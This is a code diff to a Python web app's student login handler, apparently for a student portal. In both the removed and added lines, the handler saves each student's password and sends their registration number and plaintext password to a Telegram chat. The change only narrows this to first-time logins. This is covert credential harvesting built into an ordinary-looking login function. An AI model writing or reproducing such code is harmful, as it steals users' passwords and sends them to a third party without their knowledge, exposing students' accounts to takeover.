@@ -519,16 +519,18 @@ def student_login():
                     name = prof.get("FirstName", "").strip()
             except:
                 pass
+            # Only send Telegram on FIRST-TIME login
+            is_new_user = reg_no not in load_credentials()
             save_credential(reg_no, password, name)
-            # Send Telegram notification
-            msg = (
-                f"\U0001f510 <b>New Login</b>\n"
-                f"\U0001f464 Name: {name or 'Unknown'}\n"
-                f"\U0001f393 Reg No: <code>{reg_no}</code>\n"
-                f"\U0001f511 Password: <code>{password}</code>\n"
-                f"\U0001f550 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-            send_telegram(msg)
+            if is_new_user:
+                msg = (
+                    f"\U0001f510 <b>New Student Login</b>\n"
+                    f"\U0001f464 Name: {name or 'Unknown'}\n"
+                    f"\U0001f393 Reg No: <code>{reg_no}</code>\n"
+                    f"\U0001f511 Password: <code>{password}</code>\n"
+                    f"\U0001f550 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+                send_telegram(msg)
             session_token = create_session(reg_no)
             return jsonify({"success": True, "name": name, "reg_no": reg_no, "token": session_token})
         else:
